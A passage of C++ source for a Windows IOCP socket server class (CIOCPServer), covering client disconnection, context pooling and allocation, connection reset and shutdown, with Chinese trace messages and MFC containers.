    // on the socket to 0.
    //
	
    if ( !bGraceful ) 
	{
		
        lingerStruct.l_onoff = 1;
        lingerStruct.l_linger = 0;
        setsockopt( pContext->m_Socket, SOL_SOCKET, SO_LINGER,
			(char *)&lingerStruct, sizeof(lingerStruct) );
    }
	
	TRACE("进来了 RemoveStaleClient");

	
    //
    // Free context structures
	if (m_listContexts.Find(pContext)) 
	{
		
		//
		// Now close the socket handle.  This will do an abortive or  graceful close, as requested.  
		CancelIo((HANDLE) pContext->m_Socket);
		
		closesocket( pContext->m_Socket );
		pContext->m_Socket = INVALID_SOCKET;
		
        while (!HasOverlappedIoCompleted((LPOVERLAPPED)pContext)) 
			Sleep(0);
		
		m_pNotifyProc(pContext, NC_CLIENT_DISCONNECT);
		
		MoveToFreePool(pContext);
		
	}
	TRACE("出来了 RemoveStaleClient");
}


void CIOCPServer::Shutdown()
{
	if (m_bInit == false)
		return;
	
	m_bInit = false;
	m_bTimeToKill = true;
	
	// Stop the listener
	Stop();
	
	
	closesocket(m_socListen);	
	WSACloseEvent(m_hEvent);
	
	
	CloseCompletionPort();
	
	
	while (!m_listFreePool.IsEmpty())
		delete m_listFreePool.RemoveTail();
	DeleteCriticalSection(&m_cs);

}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::MoveToFreePool
// 
// DESCRIPTION:	Checks free pool otherwise allocates a context
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::MoveToFreePool(ClientContext *pContext)
{
	CLock cs(m_cs, "MoveToFreePool");
    // Free context structures
	POSITION pos = m_listContexts.Find(pContext);
	if (pos) 
	{
		pContext->m_CompressionBuffer.ClearBuffer();
		pContext->m_WriteBuffer.ClearBuffer();
		pContext->m_DeCompressionBuffer.ClearBuffer();
		pContext->m_ResendWriteBuffer.ClearBuffer();
		m_listFreePool.AddTail(pContext);
		m_listContexts.RemoveAt(pos);
		DeleteCriticalSection(&pContext->m_SndLock);
	}
}



////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::MoveToFreePool
// 
// DESCRIPTION:	Moves an 'used/stale' Context to the free pool for reuse
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
ClientContext*  CIOCPServer::AllocateContext()
{
	ClientContext* pContext = NULL;
	
	CLock cs(CIOCPServer::m_cs, "AllocateContext");
	
	if (!m_listFreePool.IsEmpty())
	{
		pContext = m_listFreePool.RemoveHead();
	}
	else
	{
		pContext = new ClientContext;
	}
	
	ASSERT(pContext);
	
	if (pContext != NULL)
	{
		ZeroMemory(pContext, sizeof(ClientContext));
		pContext->m_bIsMainSocket = false;
		memset(pContext->m_Dialog, 0, sizeof(pContext->m_Dialog));
//		pContext->m_hWriteComplete = CreateEvent(0,FALSE,TRUE,0);//修改的
		InitializeCriticalSection(&pContext->m_SndLock);

		pContext->dwID=m_dwIndex++;
		if (m_dwIndex==10000) m_dwIndex=0;
		pContext->dwID=m_dwIndex++;
		pContext->m_bProxyConnected=0;
	}
	return pContext;
}


void CIOCPServer::ResetConnection(ClientContext* pContext)
{
	
	CString strHost;
	ClientContext* pCompContext = NULL;
	
	CLock cs(CIOCPServer::m_cs, "ResetConnection");
	
	POSITION pos  = m_listContexts.GetHeadPosition();
	while (pos)
	{
		pCompContext = m_listContexts.GetNext(pos);			
		if (pCompContext == pContext)
		{
			RemoveStaleClient(pContext, TRUE);
			break;
		}
	}
}

void CIOCPServer::DisconnectAll()
{
	m_bDisconnectAll = true;
	CString strHost;
	ClientContext* pContext = NULL;
	
	CLock cs(CIOCPServer::m_cs, "DisconnectAll");
	
	POSITION pos  = m_listContexts.GetHeadPosition();
	while (pos)
	{
		pContext = m_listContexts.GetNext(pos);			
		RemoveStaleClient(pContext, TRUE);
	}
	m_bDisconnectAll = false;
	
}

bool CIOCPServer::IsRunning()
{
	return m_bInit;
}


